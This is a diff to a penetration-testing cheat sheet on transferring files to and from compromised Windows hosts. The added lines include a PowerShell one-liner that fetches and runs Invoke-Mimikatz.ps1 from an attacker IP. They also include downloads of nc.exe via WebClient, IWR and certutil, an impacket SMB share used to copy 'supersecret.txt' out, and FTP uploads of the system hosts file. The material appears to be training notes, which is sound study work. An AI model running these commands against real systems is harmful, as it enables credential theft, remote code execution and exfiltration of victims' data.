@@ -9,6 +9,47 @@ tools: ['ftp', 'openssl', 'python', 'impacket-smb-server']
 
 ## Download Operations
 
+### HTTP Method
+
+```bash
+python3 -m http.server 80
+```
+
+```powershell
+# Execute a remote script
+IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.1.30/Invoke-Mimikatz.ps1')
+
+# Invoke-Web-Request
+IWR -Uri http://172.16.1.30/nc.exe -OutFile C:\temp\nc.exe
+
+# Non-Interactive
+(New-Object System.Net.WebClient).DownloadFile('http://172.16.1.30/nc.exe', 'C:\temp\nc.exe')
+
+# Using certutil
+certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+```
+
+---
+
+### SMB
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+```powershell
+# Mount
+net use n: \\192.168.1.10\share /user:test test
+
+# Download
+copy \\192.168.1.10\nc.exe C:\temp\nc.exe
+
+# Upload
+copy C:\temp\supersecret.txt \\192.168.1.10\supersecret.txt
+```
+
+---
+
 ### PowerShell Base64 Encode & Decode
 
 Windows Command Line utility (cmd.exe) has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send  extremely large strings. 
@@ -38,30 +79,6 @@ Algorithm       Hash                                                            
 ---------       ----                                                                   ----
 MD5             4E301756A07DED0A2DD6953ABF015278
 ```
-
----
-
-### SMB Downloads
-
-**Create share with impacket:**
-
-`sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
-
-**Mount the share:**
-
-`net use n: \\192.168.1.10\share /user:test test`
-
----
-
-### Python FTP Server
-
-**Start server:**
-
-`sudo python3 -m pyftpdlib --port 21`
-
-**Grab file:**
-
-`(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
 
 ---
 
@@ -124,11 +141,15 @@ nc -lvnp 8000
 
 **Start the server:**
 
-`sudo python3 -m pyftpdlib --port 21 --write`
+```bash
+sudo python3 -m pyftpdlib --port 21 --write
+```
 
 **PowerShell Upload:**
 
-`(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
 
 **Create a Command File for the FTP Client to Upload a File**
 
@@ -142,7 +163,6 @@ ftp -v -n -s:ftpcommand.txt
 ftp> open 192.168.1.10
 
 Log in with USER and PASS first.
-
 
 ftp> USER anonymous
 ftp> PUT c:\windows\system32\drivers\etc\hosts
